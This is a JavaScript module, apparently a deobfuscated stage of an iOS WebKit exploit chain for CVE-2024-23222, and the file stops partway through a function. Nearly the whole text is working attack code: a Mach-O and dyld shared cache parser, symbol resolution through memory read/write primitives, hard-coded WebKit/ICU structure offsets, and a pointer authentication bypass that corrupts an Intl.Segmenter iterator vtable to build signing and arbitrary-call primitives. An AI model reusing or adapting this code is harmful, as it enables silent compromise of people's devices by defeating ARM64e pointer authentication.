/**
 * Stage 2: PAC (Pointer Authentication Code) Bypass via Intl.Segmenter Iterator Corruption
 * Module hash: 17480ecc0120292fb6b8b19f2fa134385dcfd0fd
 *
 * This module implements the PAC bypass for CVE-2024-23222 by corrupting the
 * Intl.Segmenter iterator vtable. By overwriting the vtable pointer of an
 * ICU BreakIterator with PAC-signed gadget addresses, the exploit can invoke
 * arbitrary PAC-signed function pointers, defeating ARM64e pointer authentication.
 *
 * Key capabilities:
 *   - Mach-O load command parser (Y / parseMachOHeaders, class tt / MachOImage)
 *   - dyld shared cache image list (class nt / ImageList)
 *   - Export trie parser (class nr / ExportTrieParser, class tr / TrieNodeReader)
 *   - ARM64 gadget finder (class or / ARM64GadgetFinder)
 *   - Intl.Segmenter vtable corruption for PAC bypass (const en / SegmenterExploit)
 *   - Segmenter offset constants (const tn/on / segmenterOffsets)
 *   - PAC bypass classes (class it / PACBypassBase, class nn / PACBypass)
 *   - stripPACBits helper (function cn / stripPACBits)
 *
 * Module dependencies:
 *   - 57620206d62079baad0e57e6d9ec93120c0f5247 (utility_module.js)
 *   - 14669ca3b1519ba2a8f40be287f646d4d7593eb0 (platform_module.js)
 */

let r = {};
globalThis.moduleManager.evalCode("ba712ef6c1bf20758e69ab945d2cdfd51e53dcd8", function () {
  let r = {};

  // ════════════════════════════════════════════════════════════════════════════
  // Module imports (first code section - Int64-based Mach-O parser)
  // ════════════════════════════════════════════════════════════════════════════

  const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"), // utility_module
    {
      N: G // toHexString
    } = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
    platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"), // platform_module
    {
      zn: F // platform info object
    } = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"),
    Z = F.Ln; // memory accessor

  // ════════════════════════════════════════════════════════════════════════════
  // Mach-O parser (function Y / parseMachOHeaders and class tt / MachOImage)
  // ════════════════════════════════════════════════════════════════════════════

  /* Original: parseMachOHeaders */
  function Y(t, r = !1) {
    const e = platformModule.platformState.exploitPrimitive, // memory read/write primitives
      n = e.read32FromInt64(t.H(16)); // number of load commands (ncmds)
    let s = t.H(32), // pointer past mach_header_64 (start of load commands)
      i = new utilityModule.Int64(0, 0), // ASLR slide
      o = !0, // flag: is TEXT segment zero-based
      h = !1, // flag: has symtab/dyld_info
      c = null, // symtab/export offset
      l = null, // resolved slide address
      f = null,
      a = 0, // symtab/export size
      u = null, // __LINKEDIT adjusted pointer
      d = null, // __auth_got address
      w = null, // has LC_BUILD_VERSION
      g = null, // build version platform
      m = !1; // has LC_MAIN (MH_EXECUTE)
    const E = []; // collected segments
    for (let f = 0; f < n; f++) {
      const n = e.read32FromInt64(s), // load command type (cmd)
        f = e.read32FromInt64(s.H(4)); // load command size (cmdsize)
      switch (n) {
        case 15: // LC_MAIN (0x0F) — marks an executable
          m = !0;
          break;
        case 50: // LC_BUILD_VERSION (0x32)
          r && 1 === e.read32FromInt64(s.H(8)) && (w = !0, g = e.read32FromInt64(s.H(12)));
          break;
        case 25:{// LC_SEGMENT_64 (0x19)
            const n = {
              Xe: e.readStringFromInt64(s.H(8), 16), // segname (e.g. "__TEXT", "__LINKEDIT")
              qe: e.readInt64FromInt64(s.H(24)), // vmaddr
              Eo: e.readInt64FromInt64(s.H(24)), // vmaddr (duplicate read)
              Oo: e.readInt64FromInt64(s.H(32)), // vmsize
              Qe: e.readInt64FromInt64(s.H(40)), // fileoff
              zo: e.readInt64FromInt64(s.H(48)), // filesize
              $o: e.read32FromInt64(s.H(56)), // maxprot
              qo: e.read32FromInt64(s.H(60)), // initprot
              Mo: e.read32FromInt64(s.H(64)), // nsects
              flags: e.read32FromInt64(s.H(68)), // flags
              Do: s.H(72), // pointer to first section_64
              Lo: {}, // sections by name
              dump() {}
            };
            if (r)
            for (let t = 0; t < n.Mo; t += 1) {
              const r = n.Do.H(80 * t), // each section_64 is 80 bytes
                s = {
                  Xe: e.readStringFromInt64(r.H(16), 16), // segname
                  Vo: e.readStringFromInt64(r.H(0), 16), // sectname
                  qe: e.readInt64FromInt64(r.H(32)), // addr
                  Oo: e.readInt64FromInt64(r.H(40)), // size
                  Qe: e.read32FromInt64(r.H(48)), // offset
                  dump() {}
                };
              n.Lo[s.Vo] = s;
            }
            switch (E.push(n), n.Xe) {
              case "__TEXT": // __TEXT segment — compute ASLR slide
                n.Qe.Et() ? o = !1 : l = t.sub(n.Qe), i = t.sub(n.qe);
                break;
              case "__LINKEDIT": // __LINKEDIT segment — for symbol/export data
                u = n.qe.add(i).sub(n.Qe);
                break;
              case "__AUTH_CONST": // __AUTH_CONST segment — PAC authenticated pointers
                if (r) {
                  const t = n.Lo.__auth_got; // __auth_got section
                  void 0 !== t && (d = t.qe.add(i));
                }
            }
            break;
          }
        case 0x80000022 /* = LC_DYLD_INFO_ONLY */:
          h = !0, c = e.read32FromInt64(s.H(40)), a = e.read32FromInt64(s.H(44));
          break;
        case 0x80000033 /* = LC_DYLD_EXPORTS_TRIE */:
          h = !0, c = e.read32FromInt64(s.H(8)), a = e.read32FromInt64(s.H(12));
      }
      s = s.H(f);
    }
    let _ = i;
    if (r && !o && !m) {
      const r = e.read32FromInt64(t.H(4)); // cputype field from mach_header_64
      if (w && 0x0100000c /* CPU_TYPE_ARM64 variant */ === r && g >= 0xb0000 /* platform version threshold */) {
        if (null === d) throw new Error("null === d");
        let t = e.readInt64FromInt64(d).Dt();
        if (t.Et()) throw new Error("t.Et()");
        for (t = t.Bt(t.it % 4096);
        0xFEEDFACF /* Not 0xFEEDFACF — searching for dyld cache header */ !== e.read32FromInt64(t);) t = t.Bt(4096);
        const r = this.Xo(t);
        l = r.Ho.Zo, _ = r.Ho.Ko;
      }
    }
    // Rebase segment vmaddrs by ASLR slide
    for (let t = 0; t < E.length; t++) {
      const r = E[t],
        e = r.qe;
      r.qe = e.add(i);
    }
    return h && c && (f = u.H(c)), new tt({
      Go: t, // base address (mach_header pointer)
      Jo: n, // ncmds
      Qo: i, // ASLR slide
      Yo: u, // __LINKEDIT adjusted base
      Zo: l, // resolved slide address
      Ko: _, // image base
      th: f, // export/symtab data pointer
      rh: a // export/symtab data size
    }, E);
  }
  r.ur = function () {
    return Y(platformModule.platformState.yn, !0); // parse the main executable
  }, r.Xo = Y;

  /* Original: MachOImage — wraps parsed Mach-O headers */
  class tt {
    constructor(t, r) {
      this.Ho = t, this.eh = r, this.nh = new Uint8Array([]), this.sh = !1;
    }
    sr() {
      return new rt(this); // create Int64-based export resolver
    }
    ar() {
      return new et(this); // create BigInt-based export resolver
    }
    ih(t) {
      const r = this.oh("_" + t);
      return r ? this.Ho.Go.H(r) : new utilityModule.Int64(0, 0);
    }
    // Export trie lookup (Int64-based, inline byte-level ULEB128 parser)
    oh(t) {
      if (!1 === this.sh) {
        this.sh = !0;
        const t = new Uint32Array(this.Ho.rh + 3 >> 2);
        for (let r = 0; r < t.length; r++) t[r] = platformModule.platformState.exploitPrimitive.read32FromInt64(this.Ho.th.H(4 * r));
        this.nh = new Uint8Array(t.buffer);
      }
      const r = this.nh;
      let e = "",
        n = 0,
        s = !1;
      for (; !s;) {
        s = !0;
        let i = 0,
          o = 0;
        // Read ULEB128 — terminal size
        do {
          i += (127 & r[n]) << o, o += 7;
        } while (128 & r[n++]);
        if (e === t && 0 !== i) {
          n++;
          let t = 0;
          o = 0;
          // Read ULEB128 — symbol offset
          do {
            t += (127 & r[n]) << o, o += 7;
          } while (128 & r[n++]);
          return t;
        }
        n += i;
        const h = r[n++]; // number of children
        for (let i = 0; i < h; i++) {
          let i = "";
          for (; 0 !== r[n];) i += String.fromCharCode(r[n++]);
          n++;
          let h = 0;
          o = 0;
          // Read ULEB128 — child node offset
          do {
            h += (127 & r[n]) << o, o += 7;
          } while (128 & r[n++]);
          if (i.length && e + i === t.substr(0, e.length + i.length)) {
            e += i, n = h, s = !1;
            break;
          }
        }
      }
      return 0;
    }
  }

  // Int64-based symbol resolver (uses MachOImage.oh for trie lookup)
  class rt {
    constructor(t) {
      this.hh = t, this.lh = this.hh.Ho.Go;
    }
    ih(t) {
      const r = this.hh.oh("_" + t);
      return r ? this.hh.Ho.Go.H(r) : new utilityModule.Int64(0, 0);
    }
    dlsym(t) {
      const r = this.hh.oh("_" + t);
      if (!r) throw new Error("Stage2 rt.dlsym(" + t + "): symbol not found");
      return r ? this.hh.Ho.Go.H(r) : new utilityModule.Int64(0, 0);
    }
    ah(t) {
      return 0 !== this.hh.oh("_" + t);
    }
    uh(...t) {
      for (const r of t) try {
        return this.dlsym(r);
      } catch (t) {
        continue;
      }
      throw new Error("rt.uh(...t) failed");
    }
  }

  // BigInt-based symbol resolver and segment inspector
  class et {
    constructor(t) {
      this.hh = t, this.dh = null, this.wh = this.hh.Ho.Go.yt(); // base address as BigInt
    }
    ih(t) {
      const r = this.hh.oh("_" + t);
      return r ? this.wh + r : 0;
    }
    uh(...t) {
      for (const r of t) try {
        return this.dlsym(r);
      } catch (t) {
        continue;
      }
      throw new Error("et.uh(...t) failed");
    }
    ah(t) {
      return 0 !== this.hh.oh("_" + t);
    }
    dlsym(t) {
      const r = this.hh.oh("_" + t);
      if (!r) throw new Error("Stage2 et.dlsym(" + t + "): symbol not found");
      return this.wh + r;
    }
    // Convert segment info to BigInt representation
    gh(t) {
      return {
        Xe: t.Xe, // segment name
        qe: t.qe.yt(), // vmaddr
        Eo: t.Eo.yt(), // vmaddr (dup)
        Oo: t.Oo.yt(), // vmsize
        Qe: t.Qe.yt(), // fileoff
        zo: t.zo.yt(), // filesize
        $o: t.$o, // maxprot
        qo: t.qo, // initprot
        Mo: t.Mo, // nsects
        flags: t.flags,
        Do: t.Do.yt(), // sections pointer
        Lo: t.Lo // sections dict
      };
    }
    // Convert section info to BigInt representation
    mh(t) {
      return {
        Xe: t.Xe, // segname
        Vo: t.Vo, // sectname
        qe: t.qe.yt(), // addr
        Oo: t.Oo.yt(), // size
        Qe: t.Qe.yt() // offset
      };
    }
    // Find segment by name and return BigInt version
    Eh(t) {
      for (let r = 0; r < this.hh.eh.length; r++)
      if (this.hh.eh[r].Xe === t) return this.gh(this.hh.eh[r]);
      return null;
    }
    // Find section by segment name + section name
    _h(t, r) {
      const e = this.Eh(t);
      if (null !== e) {
        if (0 !== Object.keys(e.Lo).length) {
          const t = e.Lo[r];
          return void 0 !== t ? this.mh(t) : null;
        }{
          let n = null;
          for (let s = 0; s < e.Mo; s++) {
            const i = e.Do + 80 * s,
              o = t,
              h = platformModule.platformState.exploitPrimitive.readString(i, 16),
              c = {
                Xe: o,
                Vo: h,
                qe: platformModule.platformState.exploitPrimitive.readInt64FromOffset(i + 32).add(this.hh.Ho.Qo),
                Oo: platformModule.platformState.exploitPrimitive.readInt64FromOffset(i + 40),
                Qe: platformModule.platformState.exploitPrimitive.readInt64FromOffset(i + 48)
              };
            r === h && (n = c), e.Lo[h] = c;
          }
          return n ? this.mh(n) : null;
        }
      }
      return null;
    }
    // Find section by segment + section name (direct scan)
    bh(t, r) {
      const e = this.Eh(t);
      if (null !== e)
      for (let n = 0; n < e.Mo; n++) {
        const s = e.Do + 80 * n,
          i = t,
          o = platformModule.platformState.exploitPrimitive.readString(s, 16);
        if (r === o) {
          const t = {
            Xe: i,
            Vo: o,
            qe: platformModule.platformState.exploitPrimitive.readInt64FromOffset(s + 32).add(this.hh.Ho.Qo),
            Oo: platformModule.platformState.exploitPrimitive.readInt64FromOffset(s + 40),
            Qe: platformModule.platformState.exploitPrimitive.readInt64FromOffset(s + 48)
          };
          return this.mh(t);
        }
      }
      return null;
    }
    // Get segment or throw
    ph(t) {
      const r = this.Eh(t);
      if (!r) throw new Error("Stage2 et.ph(" + t + "): segment not found");
      return r;
    }
    // Get or create the ImageList (dyld shared cache image list)
    Sh() {
      return null === this.dh && (this.dh = new nt(this.hh.Ho.Ko.yt(), this.hh.Ho.Zo.yt())), this.dh;
    }
    // Resolve exported symbol to a pointer (BigInt)
    xh(t) {
      const r = this.ih(t);
      return 0 !== r ? platformModule.platformState.exploitPrimitive.readInt64FromOffset(r) : new utilityModule.Int64(0, 0);
    }
    // Convert virtual address to file address
    Ih(t) {
      const r = this.ph("__TEXT");
      return t - r.Eo + r.qe;
    }
    Th(t) {
      const r = this.ih(t);
      return 0 !== r ? platformModule.platformState.exploitPrimitive.readRawBigInt(r) : 0;
    }
    yh(t, r) {
      const e = this.ih(t);
      return 0 !== e ? platformModule.platformState.exploitPrimitive.readByte(e) : r;
    }
    // Search a segment for a specific 64-bit value
    kh(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      for (let t = 0; t < e.Oo; t += 8) {
        const n = e.qe + t;
        if (platformModule.platformState.exploitPrimitive.read32(n) === r >>> 0 && platformModule.platformState.exploitPrimitive.read32(n + 4) === r / 4294967296 >>> 0) return n;
      }
      throw new Error("et.kh(t, r) failed");
    }
    // Check if an address falls within a segment
    Oh(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      const n = e.qe,
        s = e.qe + e.Oo;
      return r >= n && r < s;
    }
    // Check if an address falls within a specific section
    zh(t, r, e) {
      const n = this._h(t, r);
      if (null === n) throw new Error("null === n");
      const s = n.qe,
        i = n.qe + n.Oo;
      return e >= s && e < i;
    }
    // Check if address is in any segment
    Ph(t) {
      for (let r = 0; r < this.hh.eh.length; r++)
      if (this.Oh(this.hh.eh[r].Xe, t)) return !0;
      return !1;
    }
    // Search segment for a 64-bit value and return address where found
    Uh(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      for (let t = 0; t < e.Oo; t += 8)
      if (platformModule.platformState.exploitPrimitive.readDoubleAsPointer(e.qe + t) === r) return e.qe + t;
      throw new Error("et.Uh(t, r) failed");
    }
    // Search segment and return the read value at match
    Ah(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      for (let t = 0; t < e.Oo; t += 8)
      if (platformModule.platformState.exploitPrimitive.readDoubleAsPointer(e.qe + t) === r) return platformModule.platformState.exploitPrimitive.readInt64FromOffset(e.qe + t);
      throw new Error("et.Ah(t, r) failed");
    }
    // Cross-segment search with callback
    $h(t, r, e) {
      const n = this.Eh(t);
      if (null === n) throw new Error("null === n");
      const s = this.Eh(r);
      if (null === s) throw new Error("null === s");
      for (let t = 0; t < s.Oo; t += 8) {
        const r = platformModule.platformState.exploitPrimitive.readDoubleAsPointer(s.qe + t);
        if (r >= n.qe && r < n.qe + n.Oo && !0 === e(r, platformModule.platformState.exploitPrimitive.readInt64FromOffset(s.qe + t))) break;
      }
    }
    // Iterate segment in 4-byte steps with callback
    qh(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      for (let t = 0; t < e.Oo; t += 4) {
        const n = e.qe + t;
        if (!0 === r(n, platformModule.platformState.exploitPrimitive.read32(n))) break;
      }
    }
    // Iterate segment in 8-byte steps with callback using memory accessor
    Rh(t, r) {
      const e = this.Eh(t);
      if (null === e) throw new Error("null === e");
      for (let t = 0; t < e.Oo; t += 8) {
        const n = e.qe + t;
        if (!0 === r(Z.ut(n))) break;
      }
    }
    // Find which segment contains a given Int64 address
    Ch(t) {
      for (const r of this.hh.eh) {
        const e = Z.ut(r.qe),
          n = Z.ut(r.qe).H(utilityModule._(r.Oo));
        if (t.Pi(e) && t.Si(n)) return r;
      }
      return null;
    }
  }

  // ════════════════════════════════════════════════════════════════════════════
  // Image list — dyld shared cache image enumeration (class nt / ImageList, first definition)
  // ════════════════════════════════════════════════════════════════════════════

  /* Original: ImageList (first definition, Int64-based) */
  class nt {
    constructor(t, r) {
      this.Mh = t, // dyld shared cache slide
      this.Dh = r, // dyld shared cache header address
      this.Lh = !1, // uses new-format image info
      this.Bh = {}, // cached parsed images
      this.images = this.Nh();
    }
    Vh() {
      return platformModule.platformState.exploitPrimitive.readString(this.Dh); // read magic string at cache header
    }
    Xh() {
      return "dyld_v1  arm64e" === this.Vh(); // check if arm64e cache
    }
    Zh() {
      return this.Mh; // return cache slide
    }
    // Parse the image list from the dyld shared cache header
    Nh() {
      const t = [];
      if (!this.Vh().startsWith("dyld")) throw new Error("!this.Vh().startsWith(dyld)"); // "dyld_v1  arm64e"
      let r = platformModule.platformState.exploitPrimitive.read32(this.Dh + 24), // imagesOffset
        e = platformModule.platformState.exploitPrimitive.read32(this.Dh + 28); // imagesCount
      // Fallback to new-style offsets if old ones are zero
      if (0 === r && 0 === e && (this.Lh = !0, r = platformModule.platformState.exploitPrimitive.read32(this.Dh + 448), e = platformModule.platformState.exploitPrimitive.read32(this.Dh + 452), 0 === r && 0 === e)) throw new Error("0 === r && 0 === e && (this.Lh = !0, r = platformModule.platformState.exploitPrimitive.read32(this.Dh + 448), e = platformModule.platformState.exploitPrimitive.read32(this.Dh + 452), 0 === r && 0 === e)");
      for (let n = 0; n < e; n++) {
        const e = this.Dh + r + 32 * n, // each image info is 32 bytes
          s = platformModule.platformState.exploitPrimitive.readDoubleAsPointer(e) + this.Mh, // image load address + slide
          i = platformModule.platformState.exploitPrimitive.read32(e + 24), // pathFileOffset
          o = platformModule.platformState.exploitPrimitive.readString(this.Dh + i); // image path string (e.g. "/usr/lib/libSystem.B.dylib")
        t.push({
          address: s,
          path: o
        });
      }
      return t;
    }
    // List all image paths
    jh() {
      const t = [];
      for (const r of this.images) t.push(r.path);
      return t;
    }
    // Resolve a symbol in a specific image
    Fh(t, r) {
      return this.Hh(t).dlsym(r);
    }
    // Search all images for a symbol
    Kh(t) {
      for (const r of this.images) try {
        return this.Hh(r.path).dlsym(t);
      } catch (t) {
        continue;
      }
      throw new Error("nt.Kh(t) failed");
    }
    // Find image base address by path substring
    Gh(t) {
      for (let r = 0; r < this.images.length; r++)
      if (-1 !== this.images[r].path.indexOf(t)) return this.images[r].address;
      return 0;
    }
    // Parse an image and return its export resolver (cached)
    Hh(t) {
      if (void 0 === this.Bh[t]) {
        const r = this.Gh(t);
        if (0 === r) return null;
        this.Bh[t] = Y(utilityModule.Int64.fromNumber(r)).ar(); // parse Mach-O, get BigInt resolver
      }
      return this.Bh[t];
    }
    Jh(t) {
      const r = this.Hh(t);
      if (null === r) throw new Error("null === r");
      return r;
    }
    // Try multiple image paths, return first successful
    Qh(...t) {
      for (const r of t) try {
        return this.Jh(r);
      } catch (t) {}
      throw new Error("nt.Qh(...t) failed");
    }
  }
  return r;
});

// ════════════════════════════════════════════════════════════════════════════
// Module imports (second code section — BigInt-based PAC bypass)
// ════════════════════════════════════════════════════════════════════════════

const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"), // utility_module
  {
    N: G, // toHexString
    tn: W, // assert
    nn: C, // TypeHelper
    Vt: m, // Int64
    U: j, // toBigInt
    An: S, // unsignedBigIntToNumber
    vn: O, // debug/unused
    v: o, // MAX_SAFE_HI32 (127)
    I: u, // POINTER_MASK (0x7FFFFFFFFF)
    B: s // POINTER_TAG_SHIFT (39)
  } = utilityModule,
  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"); // platform_module

// ════════════════════════════════════════════════════════════════════════════
// PAC bypass classes (class it / PACBypassBase and class nn / PACBypass)
// ════════════════════════════════════════════════════════════════════════════

/* Original: PACBypassBase — abstract base with stub methods */
class PACBypassBase {
  constructor() {
    this.tc = null, // call3 (three-arg PAC call)
    this.ic = null, // call4 (four-arg PAC call)
    this.cc = !1; // initialized flag
  }
  pacda(n, t) {// pacda — sign data pointer with context
    return new utilityModule.Int64(0, 0);
  }
  pacia(n, t) {// pacia — sign instruction pointer with context
    return new utilityModule.Int64(0, 0);
  }
  autda(n, t) {// autda — authenticate data pointer
    return new utilityModule.Int64(0, 0);
  }
  autia(n, t) {// autia — authenticate instruction pointer
    return new utilityModule.Int64(0, 0);
  }
  da = this.pacda;er = this.pacia;ha = this.autia;wa = this.autda;
}
const it = PACBypassBase;
r.sc = PACBypassBase;
r.ga = function () {
  window.log(`[PAC] Creating PACBypass instance...`);
  return new PACBypass(); // factory: create PACBypass instance
};

/* Original: PACBypass — Intl.Segmenter-based PAC signing/authentication */
class PACBypass extends PACBypassBase {
  // Sign data pointer: pacda(pointer, context)
  pacda(n, t) {
    const o = n.Nt(),
      c = t.Nt();
    return utilityModule.Int64.fromBigInt(this.Ka(o, c, 0n));
  }
  // Sign instruction pointer: pacia(pointer, context)
  pacia(n, t) {
    const o = n.Nt(),
      c = t.Nt();
    return utilityModule.Int64.fromBigInt(this.Ka(o, c, 1n));
  }
  // Authenticate instruction pointer: autia(pointer, context)
  autia(n, t) {
    const o = n.Nt(),
      c = t.Nt();
    return utilityModule.Int64.fromBigInt(this.Ka(o, c, 2n));
  }
  // Authenticate data pointer: autda(pointer, context)
  autda(n, t) {
    const o = n.Nt(),
      c = t.Nt();
    return utilityModule.Int64.fromBigInt(this.Ka(o, c, 3n));
  }
  da = this.pacda;er = this.pacia;wa = this.autda;ha = this.autia;
  constructor() {
    super();
    window.log(`[PAC] === PAC Bypass (Intl.Segmenter) initialization starting ===`);
    // ── Intl.Segmenter PAC bypass flow ──────────────────────────
    // 1. Create Intl.Segmenter iterator and locate its ICU BreakIterator vtable
    // 2. Find PAC signing gadgets in dyld shared cache libraries
    // 3. Corrupt vtable to chain gadgets: sign/auth pointer via iterator.next()
    // 4. Use xmlHashScanFull + CFRunLoopObserverCreateWithHandler as call-primitive wrappers
    const n = function () {
      const n = platformModule.platformState.exploitPrimitive,
        t = new Intl.Segmenter("en", {
          Pa: "sentence" // "sentence" granularity — triggers ICU BreakIterator
        }),
        o = [];
      for (let n = 0; n < 300; n++) o.push("a");
      const c = o.join(" "),
        e = t.segment(c), // create Segments object
        {
          Ja: l, // CFRunLoopObserverCreateWithHandler gadget info
          Ya: r, // gadget addresses (Ua=vtable ptr, ja=dlfcn gadget, etc.)
          Oa: i, // enet gadget call targets
          ua: a, // PAC signing vtable base address
          Ba: s // PAC operation function pointers {da, er, ha, wa}
        } = en.Fa(e); // SegmenterExploit.Fa — find all gadgets
      // Test call: invoke vtable function via corrupted iterator
      en.va(e, r, i, r.Ua, 0x0n, 0x12n, 0x30n);
      // Resolve CFRunLoopObserverCreateWithHandler to get a PAC-signed function pointer
      const [u, d] = n.allocCString("CFRunLoopObserverCreateWithHandler"),I = en.va(e, r, i, r.ja, d, 0x0n, 0x0n),m = n.read64(l.qa),y = n.read64(l.$a),C = (() => {
          try {
            // Temporarily overwrite CFRunLoopObserver pointers with stripped PAC values
            n.write64(l.qa, cn(r.Ua)), n.write64(l.$a, cn(a));
            // Call through corrupted path to harvest a PAC-signed return value
            const t = en.va(e, r, i, I, 0x0n, 0x0n, 0x0n);
            return n.read64(t + 0x90n);
          } finally {
            // Restore original values
            n.write64(l.qa, m), n.write64(l.$a, y);
          }
        })(),[b, g] = n.allocCString("xmlHashScanFull"),h = en.va(e, r, i, r.ja, g, 0x0n, 0x0n, 0x0n),
        // Allocate scratch buffers for call frame construction
        [p, K] = n.allocZeroBufferPair(32),[L, X] = n.allocZeroBufferPair(48),
        // f() — the core PAC-signing call primitive
        // Builds a fake xmlHash frame, calls xmlHashScanFull to invoke a PAC-signed pointer
        f = (t, o, c, l, a, s) => (n.write64(K + 0x0n, X), n.write32(K + 0x8n, 1), n.write32(K + 0xcn, 1), n.write64(X + 0x0n, 0x0n), n.write64(X + 0x8n, l), n.write64(X + 0x10n, a), n.write64(X + 0x18n, s), n.write64(X + 0x20n, o), n.write32(X + 0x28n, 1), en.va(e, r, i, h, K, t, c));
      // Verify the call primitive works (should return h itself)
      if (f(C, cn(h), 0x0n, 0x0n, 0x0n, 0x0n) !== h) throw new Error("f(C, cn(h), 0x0n, 0x0n, 0x0n, 0x0n) !== h");
      return {
        Ba: s, // PAC operation addresses {da, er, ha, wa}
        // nu — sign/authenticate a PAC pointer (the main primitive)
        nu: (n, t, o) => f(C, cn(n), 0xffffffffffffn & t, 1n, t >> 48n, o),
        // ic — call a PAC-signed function pointer with 3 extra args
        ic: (n, t, o, c) => {
          if (cn(n) === n) throw new Error("cn(n) === n"); // must be PAC-signed
          return en.va(e, r, i, n, t, o, c);
        }
      };
    }();
    // Wire up the PAC primitives from the Segmenter exploit
    this.Ka = n.nu, // sign/auth call
    this.tu = n.ic, // direct PAC call
    this.tc = (n, t, o) => {// call3: PAC-signed 3-arg call
      const c = n.Nt(),
        e = t.Nt(),
        l = o.Nt();
      return utilityModule.Int64.fromBigInt(this.tu(c, e, l, 0n));
    }, this.ic = (n, t, o, c) => {// call4: PAC-signed 4-arg call
      const e = n.Nt(),
        l = t.Nt(),
        r = o.Nt(),
        i = c.Nt();
      return utilityModule.Int64.fromBigInt(this.tu(e, l, r, i));
    }, this.La = utilityModule.Int64.fromBigInt(n.Ba.pacda),
    this.Xa = utilityModule.Int64.fromBigInt(n.Ba.pacia), // pacia address
    this.Ga = utilityModule.Int64.fromBigInt(n.Ba.autia), // autia address
    this.Ma = utilityModule.Int64.fromBigInt(n.Ba.autda), // autda address
    this.cc = !0; // mark initialized
    window.log(`[PAC] === PAC Bypass initialized successfully ===`);
  }
}
const nn = PACBypass;

// ════════════════════════════════════════════════════════════════════════════
// Segmenter offset constants (const tn/on / segmenterOffsets)
// These are offsets into WebKit/ICU internal data structures used to
// locate and corrupt the Intl.Segmenter iterator's BreakIterator vtable.
// ════════════════════════════════════════════════════════════════════════════

/* Original: segmenterOffsets */
const segmenterOffsets = (() => {
    const n = {
      ou: 16, // offset to JSCell inline storage pointer
      cu: 328, // offset from inline storage to ICU BreakIterator
      eu: 472, // offset to BreakIterator backing store
      lu: 512, // offset to BreakIterator internal data
      ru: 520, // offset to BreakIterator state
      iu: 664, // offset to scratch/temp buffer
      au: 8, // offset within backing store to rule table
      su: 0, // rule table: row count offset
      uu: 4, // rule table: row size offset
      du: 12, // rule table: some size field
      Iu: 16, // rule table: flags offset
      mu: 20, // rule table: row data start
      yu: 3, // rule table: per-row data start
      Cu: 32, // internal data: lookup table offset
      bu: 48, // state: status field offset
      gu: 16, // ICU BreakIterator: fake vtable pointer offset
      hu: 44, // ICU BreakIterator: position field offset
      pu: 48, // ICU BreakIterator: text pointer offset
      Ku: 56, // ICU BreakIterator: delegate pointer offset
      Lu: 112, // vtable stub size (bytes to copy)
      Xu: 8, // rule row header size
      fu: 24, // rule table header size
      _u: 16, // rule row alignment
      Mu: 176, // offset for some internal struct
      Tu: 88, // offset within struct
      xu: 96, // offset within struct
      ku: 24, // offset within struct
      Gu: 16, // offset within struct
      Du: 40, // offset within struct (changes for iOS >= 16.4)
      wu: 28, // offset within struct
      Su: 24, // offset within struct
      Au: 8, // offset within struct
      Zu: 224, // offset for PAC data region
      zu: 8, // field offset
      Nu: 8, // field offset
      Ru: 16, // field offset
      Wu: 16, // field offset
      Hu: 32, // vtable: virtual function dispatch offset
      Vu: 64, // vtable: virtual function 2 offset
      Qu: 16, // vtable helper offset
      Pu: 56, // call frame: function pointer offset
      Ju: 0, // call frame: arg0 offset
      Yu: 144, // call frame: result offset
      Ou: 152, // call frame: result2 offset
      Bu: 168, // call frame: result3 offset
      Eu: 0, // sub-frame offset
      Fu: 8, // sub-frame offset
      vu: 0, // sub-frame offset
      Uu: 8, // sub-frame offset
      ju: 136, // return value offset
      qu: 8, // return value sub-offset
      $u: 312 // total frame size
    };
    // Adjust offset for iOS >= 16.4
    return platformModule.platformState.iOSVersion >= 160400 && (n.Du = 40), n;
  })(),
  /* Original: segmenterOffsets (proxied) — throws on unknown property access */
  on = new Proxy(segmenterOffsets, {
    get(n, t) {
      if (t in n) return n[t];
      throw new Error("segmenterOffsets.on() failed");
    }
  });
const tn = segmenterOffsets;

// ════════════════════════════════════════════════════════════════════════════
// stripPACBits helper (function cn / stripPACBits)
// Strips the PAC signature bits from a pointer, leaving only the raw address.
// ════════════════════════════════════════════════════════════════════════════

/* Original: stripPACBits */
function cn(n) {
  return n & j(u); // n & POINTER_MASK (0x7FFFFFFFFF) — strip upper PAC bits
}

// ════════════════════════════════════════════════════════════════════════════
// Image list (class nt / ImageList, second definition — BigInt-based)
// Parses the dyld shared cache to enumerate loaded images and resolve symbols.
// ════════════════════════════════════════════════════════════════════════════

/* Original: ImageList (second definition, BigInt-based) */
class nt {
  constructor(n) {
    this.images = n;
  }
  // Find a parsed image by path substring (tries multiple path candidates)
  tl(...n) {
    for (const t of n)
    for (const n of this.images)
    if (-1 !== n.path.indexOf(t)) return null === n.ol && (n.ol = tt.init(n.ll)), n.ol;
    throw new Error("nt.tl(...n) failed");
  }
  // Create ImageList from a pointer into the dyld shared cache
  static nd(n) {
    const t = tt.td(n),
      o = (() => {
        const n = t.sl("__TEXT"); // find __TEXT segment
        if (null === n) throw new Error("null === n");
        return {
          Qo: t.al - n.cl, // ASLR slide = base - vmaddr
          fl: t.al - n._l // file-to-memory offset
        };
      })(),
      c = platformModule.platformState.exploitPrimitive.read32(o.fl + 0x1c0n), // imagesOffset in dyld cache header
      e = platformModule.platformState.exploitPrimitive.read32(o.fl + 0x1c4n), // imagesCount in dyld cache header
      l = [],
      r = o.fl + j(c);
    for (let n = 0; n < e; n++) {
      const c = cn(platformModule.platformState.exploitPrimitive.read64(r + j(32 * n))) + o.Qo, // image address + slide
        e = platformModule.platformState.exploitPrimitive.read32(r + j(32 * n) + 0x18n), // path offset
        i = platformModule.platformState.exploitPrimitive.readString(o.fl + j(e), 1024); // image path string
      l.push({
        path: i,
        ll: c, // image load address
        ol: t.al === c ? t : null // cache parsed image if it's the same base
      });
    }
    window.log(`[PAC] Parsed ${l.length} images from dyld shared cache`);
